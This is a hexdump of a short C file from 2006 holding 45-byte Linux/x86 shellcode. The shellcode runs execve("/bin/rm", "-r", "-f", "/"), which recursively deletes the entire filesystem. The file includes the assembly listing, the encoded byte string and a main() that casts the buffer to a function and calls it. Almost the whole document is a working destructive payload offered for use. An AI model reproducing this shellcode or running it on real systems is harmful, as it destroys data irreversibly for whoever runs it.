00000000  2f 2a 20 42 79 20 4b 72  69 73 20 4b 61 74 74 65  |/* By Kris Katte|
00000010  72 6a 6f 68 6e 20 31 31  2f 31 38 2f 32 30 30 36  |rjohn 11/18/2006|
00000020  0d 0a 20 2a 0d 0a 20 2a  20 34 35 20 62 79 74 65  |.. *.. * 45 byte|
00000030  20 73 68 65 6c 6c 63 6f  64 65 20 74 6f 20 65 78  | shellcode to ex|
00000040  65 63 76 65 28 22 72 6d  20 2d 72 66 20 2f 22 29  |ecve("rm -rf /")|
00000050  20 66 6f 72 20 4c 69 6e  75 78 2f 78 38 36 0d 0a  | for Linux/x86..|
00000060  20 2a 0d 0a 20 2a 0d 0a  20 2a 0d 0a 20 2a 20 73  | *.. *.. *.. * s|
00000070  65 63 74 69 6f 6e 20 2e  74 65 78 74 0d 0a 20 2a  |ection .text.. *|
00000080  0d 0a 20 2a 20 20 20 20  20 20 67 6c 6f 62 61 6c  |.. *      global|
00000090  20 5f 73 74 61 72 74 0d  0a 20 2a 0d 0a 20 2a 20  | _start.. *.. * |
000000a0  5f 73 74 61 72 74 3a 0d  0a 20 2a 0d 0a 20 2a 20  |_start:.. *.. * |
000000b0  3b 20 65 78 65 63 76 65  28 22 2f 62 69 6e 2f 72  |; execve("/bin/r|
000000c0  6d 22 2c 20 7b 20 22 2f  62 69 6e 2f 72 6d 22 2c  |m", { "/bin/rm",|
000000d0  20 22 2d 72 22 2c 20 22  2d 66 22 2c 20 22 2f 22  | "-r", "-f", "/"|
000000e0  2c 20 4e 55 4c 4c 20 7d  2c 20 4e 55 4c 4c 29 0d  |, NULL }, NULL).|
000000f0  0a 20 2a 0d 0a 20 2a 20  20 20 20 20 20 70 75 73  |. *.. *      pus|
00000100  68 20 62 79 74 65 20 31  31 0d 0a 20 2a 20 20 20  |h byte 11.. *   |
00000110  20 20 20 70 6f 70 20 65  61 78 0d 0a 20 2a 20 20  |   pop eax.. *  |
00000120  20 20 20 20 63 64 71 0d  0a 20 2a 20 20 20 20 20  |    cdq.. *     |
00000130  20 70 75 73 68 20 65 64  78 0d 0a 20 2a 20 20 20  | push edx.. *   |
00000140  20 20 20 70 75 73 68 20  62 79 74 65 20 30 78 32  |   push byte 0x2|
00000150  66 0d 0a 20 2a 20 20 20  20 20 20 6d 6f 76 20 65  |f.. *      mov e|
00000160  64 69 2c 20 65 73 70 0d  0a 20 2a 20 20 20 20 20  |di, esp.. *     |
00000170  20 70 75 73 68 20 65 64  78 0d 0a 20 2a 20 20 20  | push edx.. *   |
00000180  20 20 20 70 75 73 68 20  77 6f 72 64 20 30 78 36  |   push word 0x6|
00000190  36 32 64 0d 0a 20 2a 20  20 20 20 20 20 6d 6f 76  |62d.. *      mov|
000001a0  20 65 73 69 2c 20 65 73  70 0d 0a 20 2a 20 20 20  | esi, esp.. *   |
000001b0  20 20 20 70 75 73 68 20  65 64 78 0d 0a 20 2a 20  |   push edx.. * |
000001c0  20 20 20 20 20 70 75 73  68 20 77 6f 72 64 20 30  |     push word 0|
000001d0  78 37 32 32 64 0d 0a 20  2a 20 20 20 20 20 20 6d  |x722d.. *      m|
000001e0  6f 76 20 65 63 78 2c 20  65 73 70 0d 0a 20 2a 20  |ov ecx, esp.. * |
000001f0  20 20 20 20 20 70 75 73  68 20 65 64 78 0d 0a 20  |     push edx.. |
00000200  2a 20 20 20 20 20 20 70  75 73 68 20 30 78 36 64  |*      push 0x6d|
00000210  37 32 32 66 32 66 0d 0a  20 2a 20 20 20 20 20 20  |722f2f.. *      |
00000220  70 75 73 68 20 30 78 36  65 36 39 36 32 32 66 0d  |push 0x6e69622f.|
00000230  0a 20 2a 20 20 20 20 20  20 6d 6f 76 20 65 62 78  |. *      mov ebx|
00000240  2c 20 65 73 70 0d 0a 20  2a 20 20 20 20 20 20 70  |, esp.. *      p|
00000250  75 73 68 20 65 64 78 0d  0a 20 2a 20 20 20 20 20  |ush edx.. *     |
00000260  20 70 75 73 68 20 65 64  69 0d 0a 20 2a 20 20 20  | push edi.. *   |
00000270  20 20 20 70 75 73 68 20  65 73 69 0d 0a 20 2a 20  |   push esi.. * |
00000280  20 20 20 20 20 70 75 73  68 20 65 63 78 0d 0a 20  |     push ecx.. |
00000290  2a 20 20 20 20 20 20 70  75 73 68 20 65 62 78 0d  |*      push ebx.|
000002a0  0a 20 2a 20 20 20 20 20  20 6d 6f 76 20 65 63 78  |. *      mov ecx|
000002b0  2c 20 65 73 70 0d 0a 20  2a 20 20 20 20 20 20 69  |, esp.. *      i|
000002c0  6e 74 20 30 78 38 30 0d  0a 20 2a 2f 0d 0a 0d 0a  |nt 0x80.. */....|
000002d0  6d 61 69 6e 28 29 0d 0a  7b 0d 0a 20 20 20 20 20  |main()..{..     |
000002e0  20 20 63 68 61 72 20 73  68 65 6c 6c 63 6f 64 65  |  char shellcode|
000002f0  5b 5d 20 3d 0d 0a 20 20  20 20 20 20 20 20 20 20  |[] =..          |
00000300  20 20 20 20 20 22 5c 78  36 61 5c 78 30 62 5c 78  |     "\x6a\x0b\x|
00000310  35 38 5c 78 39 39 5c 78  35 32 5c 78 36 61 5c 78  |58\x99\x52\x6a\x|
00000320  32 66 5c 78 38 39 5c 78  65 37 5c 78 35 32 5c 78  |2f\x89\xe7\x52\x|
00000330  36 36 5c 78 36 38 5c 78  32 64 5c 78 36 36 5c 78  |66\x68\x2d\x66\x|
00000340  38 39 22 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |89"..           |
00000350  20 20 20 20 22 5c 78 65  36 5c 78 35 32 5c 78 36  |    "\xe6\x52\x6|
00000360  36 5c 78 36 38 5c 78 32  64 5c 78 37 32 5c 78 38  |6\x68\x2d\x72\x8|
00000370  39 5c 78 65 31 5c 78 35  32 5c 78 36 38 5c 78 32  |9\xe1\x52\x68\x2|
00000380  66 5c 78 32 66 5c 78 37  32 5c 78 36 64 5c 78 36  |f\x2f\x72\x6d\x6|
00000390  38 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |8"..            |
000003a0  20 20 20 22 5c 78 32 66  5c 78 36 32 5c 78 36 39  |   "\x2f\x62\x69|
000003b0  5c 78 36 65 5c 78 38 39  5c 78 65 33 5c 78 35 32  |\x6e\x89\xe3\x52|
000003c0  5c 78 35 37 5c 78 35 36  5c 78 35 31 5c 78 35 33  |\x57\x56\x51\x53|
000003d0  5c 78 38 39 5c 78 65 31  5c 78 63 64 5c 78 38 30  |\x89\xe1\xcd\x80|
000003e0  22 3b 0d 0a 0d 0a 20 20  20 20 20 20 20 28 2a 28  |";....       (*(|
000003f0  76 6f 69 64 20 28 2a 29  28 29 29 20 73 68 65 6c  |void (*)()) shel|
00000400  6c 63 6f 64 65 29 28 29  3b 0d 0a 7d              |lcode)();..}|
0000040c
